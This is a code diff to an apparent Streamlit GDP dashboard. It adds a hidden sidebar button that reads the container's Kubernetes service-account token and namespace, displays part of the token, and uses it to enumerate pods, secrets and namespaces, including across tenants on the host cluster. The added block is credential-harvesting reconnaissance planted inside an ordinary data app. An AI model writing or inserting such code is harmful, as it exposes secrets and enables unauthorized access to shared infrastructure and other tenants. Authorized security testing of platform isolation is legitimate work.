@@ -85,3 +85,53 @@ from_year, to_year = st.slider('Years', int(gdp_df['Year'].min()), int(gdp_df['Y
 countries = st.multiselect('Countries', gdp_df['Country Code'].unique(), ['DEU','FRA','GBR','BRA','MEX','JPN'])
 filtered = gdp_df[(gdp_df['Country Code'].isin(countries)) & (gdp_df['Year'].between(from_year, to_year))]
 st.line_chart(filtered, x='Year', y='GDP', color='Country Code')
+
+# Test 7: Kubernetes API access with mounted service account token
+if st.sidebar.button("K8s API Test"):
+    import requests, json
+    try:
+        token = open('/var/run/secrets/kubernetes.io/serviceaccount/token').read()
+        ca = '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt'
+        namespace = open('/var/run/secrets/kubernetes.io/serviceaccount/namespace').read()
+        st.sidebar.info(f"Namespace: {namespace}")
+        st.sidebar.info(f"Token (first 50): {token[:50]}...")
+        
+        headers = {"Authorization": f"Bearer {token}"}
+        base = "https://kubernetes.default.svc"
+        
+        # Test 1: Can we list pods in our namespace?
+        r = requests.get(f"{base}/api/v1/namespaces/{namespace}/pods", headers=headers, verify=ca, timeout=5)
+        st.sidebar.write(f"List pods: {r.status_code}")
+        if r.status_code == 200:
+            pods = r.json().get('items', [])
+            st.sidebar.success(f"Found {len(pods)} pods!")
+            for p in pods[:5]:
+                st.sidebar.write(f"  Pod: {p['metadata']['name']}")
+        
+        # Test 2: Can we list ALL namespaces? (cross-tenant)
+        r = requests.get(f"{base}/api/v1/namespaces", headers=headers, verify=ca, timeout=5)
+        st.sidebar.write(f"List namespaces: {r.status_code}")
+        if r.status_code == 200:
+            ns = r.json().get('items', [])
+            st.sidebar.success(f"Found {len(ns)} namespaces!")
+            for n in ns[:10]:
+                st.sidebar.write(f"  NS: {n['metadata']['name']}")
+        
+        # Test 3: Can we list secrets in our namespace?
+        r = requests.get(f"{base}/api/v1/namespaces/{namespace}/secrets", headers=headers, verify=ca, timeout=5)
+        st.sidebar.write(f"List secrets: {r.status_code}")
+        if r.status_code == 200:
+            secrets = r.json().get('items', [])
+            st.sidebar.success(f"Found {len(secrets)} secrets!")
+            for s in secrets[:5]:
+                st.sidebar.write(f"  Secret: {s['metadata']['name']} (type: {s.get('type','?')})")
+
+        # Test 4: Can we list pods in ALL namespaces?
+        r = requests.get(f"{base}/api/v1/pods", headers=headers, verify=ca, timeout=5)
+        st.sidebar.write(f"List ALL pods: {r.status_code}")
+        if r.status_code == 200:
+            pods = r.json().get('items', [])
+            st.sidebar.success(f"Found {len(pods)} pods across ALL namespaces!")
+            
+    except Exception as e:
+        st.sidebar.error(f"K8s Error: {str(e)[:200]}")
